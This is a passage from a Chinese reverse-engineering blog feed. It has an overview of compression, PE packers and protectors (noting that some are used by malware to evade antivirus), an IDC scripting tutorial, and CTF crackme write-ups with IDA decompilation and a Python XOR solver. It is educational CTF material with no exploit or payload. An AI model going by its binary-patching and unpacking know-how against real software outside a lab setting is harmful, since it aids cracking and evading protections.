    <content type="html"><![CDATA[<h1 id="一-数据压缩"><a href="#一-数据压缩" class="headerlink" title="一.数据压缩"></a>一.数据压缩</h1><p>对于数据压缩都比较熟悉，下面简单梳理一下相关知识。数据压缩(Data Compression )是计算机工程的主要研究内容，经过数十年发展已经有了深入研究，今后还会不断出现更多、更好的算法。如果日常生活中能够非常容易地压缩某个物体该多么方便啊!也就不再需要仓库、停车场、集装箱了，当然，得能压缩才行。而在数码世界,(只要不是压缩过的信息）任何信息都能轻松压缩。不论哪种形态的文件（数据）都是由二进制(0或1 )组成的，只要使用合适的压缩算法，就能缩减其大小。</p><p>经过压缩的文件若能100%恢复，则称该压缩为“无损压缩”(Lossless DataCompression );若不能恢复原状，则称该压缩为“有损压缩”( Loss Data Compression )。</p><h2 id="1-无损压缩"><a href="#1-无损压缩" class="headerlink" title="1.无损压缩"></a>1.无损压缩</h2><p>无损压缩用来缩减文件（数据)的大小，压缩后的文件更易保管、移动。使用经过压缩的文件之前，需要先对文件解压缩（此过程中应该保证数据完整性)。<br>各位肯定用过类似7-zip、“面包房”的压缩程序，用它们压缩文件就是无损压缩算法。最具代表性的无损压缩算法有Run-Length、Lempel-Ziv、Huffman等。此外还有许多其他压缩算法，它们都是在上面3种压缩算法的基础上改造而成的。只要准确理解了上面3种，就能轻松掌握其他各种压缩算法。ZIP、RAR等是具有代表性的压缩文件格式，它们最根本的压缩理念也是Run-Length、Lempel-Ziv、Huffman，然后应用了一些各自特有的技术（压缩率、压缩/解压时间)。</p><h2 id="2-有损压缩"><a href="#2-有损压缩" class="headerlink" title="2.有损压缩"></a>2.有损压缩</h2><p>相反，有损压缩允许压缩文件（数据)时损失一定信息，以此换取高压缩率。压缩多媒体文件(jpg、mp3 、mp4)时，大部分都使用这种有损压缩方式。从压缩特性来看，有损压缩的数据解压缩后不能完全恢复原始数据。人类的肉眼与听觉几乎无法察觉到这些多媒体文件在压缩中损失的数据。经过有损压缩后，虽然压缩文件与原文件(从数据层面上看)存在差异，但重要的是人们几乎区分不出这种微小的差别。以mp3文件为例，mp3的核心算法通过删除超越人类听觉范围(20~20000Hz）的波长区段来缩减（不需要的)数据大小。</p><h1 id="二-运行时压缩器"><a href="#二-运行时压缩器" class="headerlink" title="二.运行时压缩器"></a>二.运行时压缩器</h1><p>顾名思义，运行时压缩器是针对可执行(PE，Portable Executable)文件而言的，可执行文件内部含有解压缩代码，文件在运行瞬间于内存中解压缩后执行。运行时压缩文件也是PE文件，内部含有原PE文件与解码程序。在程序的EP代码中执行解码程序，同时在内存中解压缩后执行。</p><p>与普通压缩器相比，运行时压缩器的一个明显不同是“PE文件的可运行性”。把普通PE文件创建成运行时压缩文件的实用程序称为“压缩器”( Packer )，经反逆向( Anti-Reversing)技术特别处理的压缩器称为保护器(Protector )。</p><h2 id="1-压缩器"><a href="#1-压缩器" class="headerlink" title="1.压缩器"></a>1.压缩器</h2><p>PE压缩器是指可执行文件的压缩器，准确一点应该称为“运行时压缩器”，它是PE文件的专用压缩器。</p><h3 id="1-使用目的"><a href="#1-使用目的" class="headerlink" title="1.使用目的"></a>1.使用目的</h3><p>●缩减PE文件的大小<br>文件尺寸小是其突出的优点之一，更便于网络传输与保存。●隐藏PE文件内部代码与资源<br>使用压缩器的另一个原因在于，它可以隐藏PE文件内的代码及资源（字符串、API名称字符串)等。压缩后的数据以难以辨识的二进制文件保存，从文件本身来看，这能有效隐藏内部代码与资源（当然解压缩后可以通过内存的Dump窗口查看)。</p><h3 id="2-使用现状"><a href="#2-使用现状" class="headerlink" title="2.使用现状"></a>2.使用现状</h3><p>运行时压缩的概念早在DOS时代就出现了，可当时并未广泛使用。因为那时的PC速度不怎么快，每次执行文件时，解压缩的过程会引起很大的系统开销。而现在的PC速度已经变得非常快，用户不能明显察觉运行时压缩文件与源文件在执行时间上的差别。因此，现在的实用程序、“打补丁”文件、普通程序等都广泛应用运行时压缩。</p><h3 id="3-压缩器种类"><a href="#3-压缩器种类" class="headerlink" title="3.压缩器种类"></a>3.压缩器种类</h3><p>PE压缩器大致可分为两类:一类是单纯用于压缩普通PE文件的压缩器;另一类是对源文件进行较大变形、严重破坏PE头、意图稍嫌不纯的压缩器。这里说的“意图不纯的压缩器”是指专门用于恶意程序(如:Virtus、Trojan、Worm等)的压缩器。</p><p>目的纯粹的压缩器(未经VirusTotal诊断):UPX、ASPack等.<br>目的不纯的压缩器(经VirusTotal诊断):UPack、 PESpin、NSAnti等。</p><h1 id="三-保护器"><a href="#三-保护器" class="headerlink" title="三.保护器"></a>三.保护器</h1><p>PE保护器是一类保护PE文件免受代码逆向分析的实用程序。它们不像普通的压缩器一样仅对PE文件进行运行时压缩,而应用了多种防止代码逆向分析的技术(反调试、反模拟、代码混乱、多态代码、垃圾代码、调试器监视等)。这类保护器使压缩后的PE文件尺寸反而比源文件要大一些，调试起来非常难。<br>详细分析保护器需要丰富的逆向分析经验。当然，网络上提供了各种解除保护器的技巧，运气好的话，即便是新手也可能顺利找到源文件的OEP ( Original Entry Point，原始入口点)，但大多数情况没这么幸运。</p><h2 id="1-使用目的-1"><a href="#1-使用目的-1" class="headerlink" title="1.使用目的"></a>1.使用目的</h2><p>·防止破解<br>相信没人愿意自己编写的程序被非法破解并使用。此时使用保护器可有效保护PE文件。●保护代码与资源保护器不仅可以保护PE文件本身，还可在文件运行时保护进程内存，防止打开Dump窗口。因此，使用保护器可以比较安全地保护程序自身的代码与资源。</p><h2 id="2-使用现状-1"><a href="#2-使用现状-1" class="headerlink" title="2.使用现状"></a>2.使用现状</h2><p>这类保护器大量应用于对破解很敏感的安全程序。比如安装在线游戏时会自动安装安全保护程序，游戏安全保护程序就是为了防止游戏“破解工具”运行的。<br>恶意的游戏破解者总是想方设法破解游戏的安全保护程序，因为破解成功后他们可以利用“游戏内核”获取金钱回报。所以，安全保护程序为了防止恶意破解而使用各种保护器来保护自己（不断更换保护器会让游戏破解者们发疯)。<br>另一方面，常见的恶性代码(Trojan、Worm)中也大量使用保护器来防止(或降低)杀毒软件的检测。有些保护器还能提供“多变的代码”,每次都会生成不同形态（但功能相同)的代码,这给病毒诊断带来很大困难。</p><h2 id="3-保护器种类"><a href="#3-保护器种类" class="headerlink" title="3.保护器种类"></a>3.保护器种类</h2><p>保护器种类多样，有公用程序、商业程序,还有专门供恶意代码使用的保护器。</p><p>保护器分类<br>商用保护器:ASProtect. Themida、SVKP等。                                                                                                                 公用保护器:UltraProtect、Morphine等。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-数据压缩&quot;&gt;&lt;a href=&quot;#一-数据压缩&quot; class=&quot;headerlink&quot; title=&quot;一.数据压缩&quot;&gt;&lt;/a&gt;一.数据压缩&lt;/h1&gt;&lt;p&gt;对于数据压缩都比较熟悉，下面简单梳理一下相关知识。数据压缩(Data Compression )是计算机工程</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF--findKey</title>
    <link href="http://example.com/2021/08/08/BUUCTF-findKey/"/>
    <id>http://example.com/2021/08/08/BUUCTF-findKey/</id>
    <published>2021-08-08T06:39:58.000Z</published>
    <updated>2021-08-08T06:59:20.578Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF–findKey"><a href="#BUUCTF–findKey" class="headerlink" title="BUUCTF–findKey"></a>BUUCTF–findKey</h1><p>IDA打开，发现没有直接找到加密函数，通过字符串查找**flag{}**找到函数，发现没有转换成函数，选中区域，通过p键转换成函数。</p><p><img src="/2021/08/08/BUUCTF-findKey/1.PNG" alt="1"></p><p>将<strong>0kk<code>d1a</code>55k222k2a776jbfgd`06cjjb</strong>给了str，SS给了v13，sub_401005函数发现是一个异或，那就是str和v13异或，下面一个if判断String1和Str是否相等。回过头去找String1在哪里出现过，发现上面的sub_40101E对String1进行了加密</p><p><img src="/2021/08/08/BUUCTF-findKey/2.PNG" alt="2"></p><p>API CryptCreateHash，0x8003u可以知道是MD5</p><p>接下来unk_423030给v12，与原来的String1异或</p><p>第一个过程，使用0kk<code>d1a</code>55k222k2a776jbfgd`06cjjb和SS异或，得到c8837b23ff8aaa8a2dde915473ce0991，md5解密得到String1=123321</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;</span></span><br><span class="line">b = <span class="string">&quot;SS&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    s += <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) ^ <span class="built_in">ord</span>(b[i % <span class="number">2</span>]))</span><br><span class="line"><span class="built_in">print</span> (s)</span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x5F</span>, <span class="number">0x01</span>, <span class="number">0x6D</span>, <span class="number">0x69</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x6E</span>, <span class="number">0x5F</span>, <span class="number">0x02</span>, <span class="number">0x6C</span>, <span class="number">0x57</span>, <span class="number">0x5B</span>, <span class="number">0x54</span>, <span class="number">0x4C</span>,</span><br><span class="line">     <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x53</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x6B</span>, <span class="number">0x6B</span>, <span class="number">0x60</span>, <span class="number">0x64</span>, <span class="number">0x31</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x35</span>, <span class="number">0x35</span>,</span><br><span class="line">     <span class="number">0x6B</span>, <span class="number">0x32</span>, <span class="number">0x32</span>, <span class="number">0x32</span>, <span class="number">0x6B</span>, <span class="number">0x32</span>, <span class="number">0x61</span>, <span class="number">0x37</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x6A</span>, <span class="number">0x62</span>]</span><br><span class="line">d = <span class="string">&#x27;123321&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>((<span class="built_in">len</span>(c))):</span><br><span class="line">    flag += <span class="built_in">chr</span>(c[i]^<span class="built_in">ord</span>(d[i % <span class="built_in">len</span>(d)]))</span><br><span class="line"><span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BUUCTF–findKey&quot;&gt;&lt;a href=&quot;#BUUCTF–findKey&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF–findKey&quot;&gt;&lt;/a&gt;BUUCTF–findKey&lt;/h1&gt;&lt;p&gt;IDA打开，发现没有直接找到加密函数，通过字</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>IDC脚本</title>
    <link href="http://example.com/2021/08/05/idc/"/>
    <id>http://example.com/2021/08/05/idc/</id>
    <published>2021-08-05T07:29:44.000Z</published>
    <updated>2021-08-05T07:34:25.464Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IDC的变量"><a href="#IDC的变量" class="headerlink" title="IDC的变量"></a>IDC的变量</h2><p>idc使用三种基本数据类型 整形，字符串，浮点值</p><p>idc使用auto关键字声明变量，使用extern关键字声</p><p>明全局变量</p><p>auto var = 1;          //局部变量</p><p>extern var2 = 1;      //全局变量</p><h2 id="IDC的运算符"><a href="#IDC的运算符" class="headerlink" title="IDC的运算符"></a>IDC的运算符</h2><p>idc支持绝大部分c的运算符，但是不支持如+=的复合运算符，并且idc所有整数操作数</p><p>均作为有符号处理，移位运算符如&gt;&gt;总是进行算术移位，想要完成逻辑移位，必须手</p><p>动进行位运算。字符串是idc的基本类型，所以可以执行+号运算符拼接字符串。<br>IDC语句</p><p>idc不支持switch语句其他语句风格与c一致，以分号结束语句。</p><h2 id="IDC函数"><a href="#IDC函数" class="headerlink" title="IDC函数"></a>IDC函数</h2><p>idc仅在idc的独立程序脚本中支持定义用户的函数。使用static关键字声明函数，可以使用return</p><p>返回一个值，return并非必须。参数为&amp;a表示传引用</p><p>static func(a,b,c){</p><p>//函数体</p><p>}</p><h2 id="IDC实用函数"><a href="#IDC实用函数" class="headerlink" title="IDC实用函数"></a>IDC实用函数</h2><p>1）void PatchByte(long addr , long val) 设置虚拟地址addr处的一个字节值，PatchByte可更换为PatchWord，PatchDword设置虚拟地址addr处的2字节和4字节值。</p><p>2）long Byte（long addr） 从虚拟地址addr读取一个字节值，Byte可更换为Word，Dword读取2字节和4字节值。</p><p>3）void Message（string format , …）,在输出窗口打印一条格式化消息。</p><p>4）void print（…），在输出窗口中打印每个参数的字符串表示形式。</p><p>5）long atol（string val），将10进制val转化成对应整数值。</p><p>6）long xtol（string val），将16进制val转化成对应整数值。</p><p>7）long ord（string ch），返回单字符字符串ch的ASCII值。</p><p>8）string Name（long addr），返回与给定地址有关的名称，如果该位置没有名称，则返回空字符串。</p><p> 在独立的.idc脚本文件编写脚本时，需要按如下结构</p><p>#include&lt;idc.idc&gt;</p><p>static main(){</p><p>//主函数</p><p>}</p><p>保存为.idc文件后，打开ida在菜单中File&gt;Script File可以执行idc脚本</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;IDC的变量&quot;&gt;&lt;a href=&quot;#IDC的变量&quot; class=&quot;headerlink&quot; title=&quot;IDC的变量&quot;&gt;&lt;/a&gt;IDC的变量&lt;/h2&gt;&lt;p&gt;idc使用三种基本数据类型 整形，字符串，浮点值&lt;/p&gt;
&lt;p&gt;idc使用auto关键字声明变量，使用ext</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CPP</title>
    <link href="http://example.com/2021/08/05/CPP/"/>
    <id>http://example.com/2021/08/05/CPP/</id>
    <published>2021-08-05T02:40:07.000Z</published>
    <updated>2021-08-05T03:24:48.420Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GXYCTF2019-simple-CPP"><a href="#GXYCTF2019-simple-CPP" class="headerlink" title="[GXYCTF2019]simple CPP"></a>[GXYCTF2019]simple CPP</h1><p>查壳，64位无壳,先打开看看</p><p><img src="/2021/08/05/CPP/1.PNG" alt="1"></p><p>IDA打开找到主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> v3; <span class="comment">// si</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// er10</span></span><br><span class="line">  __int64 v10; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">void</span> **v11; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">void</span> **v12; <span class="comment">// r8</span></span><br><span class="line">  __int64 v13; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v14; <span class="comment">// r15</span></span><br><span class="line">  __int64 v15; <span class="comment">// r12</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v18; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v19; <span class="comment">// rdi</span></span><br><span class="line">  __int64 *v20; <span class="comment">// r14</span></span><br><span class="line">  __int64 v21; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v22; <span class="comment">// r13</span></span><br><span class="line">  __int64 *v23; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v24; <span class="comment">// r8</span></span><br><span class="line">  __int64 v25; <span class="comment">// r12</span></span><br><span class="line">  __int64 v26; <span class="comment">// r15</span></span><br><span class="line">  __int64 v27; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v28; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v29; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v30; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v31; <span class="comment">// r10</span></span><br><span class="line">  __int64 v32; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v33; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// dl</span></span><br><span class="line">  __int64 v35; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **v36; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v37; <span class="comment">// rax</span></span><br><span class="line">  __int64 v38; <span class="comment">// r8</span></span><br><span class="line">  __int64 v39; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v40; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v42; <span class="comment">// [rsp+20h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">void</span> *Block[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v44; <span class="comment">// [rsp+40h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v45; <span class="comment">// [rsp+48h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v44 = <span class="number">0</span>i64;</span><br><span class="line">  v45 = <span class="number">15</span>i64;</span><br><span class="line">  LOBYTE(Block[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  v4 = sub_1400019C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;</span>, envp);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, sub_140001B90);</span><br><span class="line">  sub_1400019C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Let&#x27;s start our game,Please input your flag:&quot;</span>, v5);</span><br><span class="line">  sub_140001DE0(<span class="built_in">std</span>::<span class="built_in">cin</span>, Block);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, sub_140001B90);</span><br><span class="line">  <span class="keyword">if</span> ( v44 - <span class="number">5</span> &gt; <span class="number">0x19</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v39 = sub_1400019C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Wrong input ,no GXY&#123;&#125; in input words&quot;</span>, v6);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v39, sub_140001B90);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = (<span class="keyword">unsigned</span> __int8 *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>ui64);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)v7 = <span class="number">0</span>i64;</span><br><span class="line">    *((_QWORD *)v7 + <span class="number">1</span>) = <span class="number">0</span>i64;</span><br><span class="line">    *((_QWORD *)v7 + <span class="number">2</span>) = <span class="number">0</span>i64;</span><br><span class="line">    *((_QWORD *)v7 + <span class="number">3</span>) = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v44 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = Block;</span><br><span class="line">      <span class="keyword">if</span> ( v45 &gt;= <span class="number">0x10</span> )</span><br><span class="line">        v11 = (<span class="keyword">void</span> **)Block[<span class="number">0</span>];</span><br><span class="line">      v12 = &amp;qword_140006048;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)qword_140006060 &gt;= <span class="number">0x10</span> )</span><br><span class="line">        v12 = (<span class="keyword">void</span> **)qword_140006048;</span><br><span class="line">      v8[v10] = *((_BYTE *)v11 + v10) ^ *((_BYTE *)v12 + v9 % <span class="number">27</span>);</span><br><span class="line">      ++v9;</span><br><span class="line">      ++v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v9 &lt; v44 );</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = <span class="number">0</span>i64;</span><br><span class="line">  v14 = <span class="number">0</span>i64;</span><br><span class="line">  v15 = <span class="number">0</span>i64;</span><br><span class="line">  v16 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v44 &gt; <span class="number">30</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v44 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  v18 = v8;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v19 = *v18 + v13;</span><br><span class="line">    ++v17;</span><br><span class="line">    ++v18;</span><br><span class="line">    <span class="keyword">switch</span> ( v17 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v16 = v19;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">        v15 = v19;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">        v14 = v19;</span><br><span class="line">LABEL_23:</span><br><span class="line">        v19 = <span class="number">0</span>i64;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">        sub_1400019C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;ERRO,out of range&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v44);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = v19 &lt;&lt; <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>sub_1400019C0输出字符串，看到sub_140001DE0有一个Block，猜测输入的flag在Block里面，下面把block给了V11，qword_140006048给了V12，进行异或加密，查看qword_140006048找不到数据，利用动态调试寻找。</p><p><img src="/2021/08/05/CPP/11.PNG" alt="11"></p><p>qword_140006048的值为i_will_check_is_debug_or_not，也可以通过交叉引用找到给qword_140006048赋值的地方</p><p><img src="/2021/08/05/CPP/2.PNG" alt="2"></p><p>接下来判断长度&gt;30 或&lt;0，V18等于V8，V8就是上面经过异或的数据，一个个赋值。然后判断累加到8，16，24的时候将值给V16，V15，V14,到32则报错。v13 = v19 &lt;&lt; 8。没错位移一个字节用于堆叠，最后没满8位将数据保存在V13.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> ( v17 &lt; (<span class="keyword">int</span>)v44 );</span><br><span class="line">  <span class="keyword">if</span> ( v16 )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = (__int64 *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>ui64);</span><br><span class="line">    *v20 = v16;</span><br><span class="line">    v20[<span class="number">1</span>] = v15;</span><br><span class="line">    v20[<span class="number">2</span>] = v14;</span><br><span class="line">    v20[<span class="number">3</span>] = v13;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">  v20 = <span class="number">0</span>i64;</span><br><span class="line">LABEL_28:</span><br><span class="line">  v42 = v20[<span 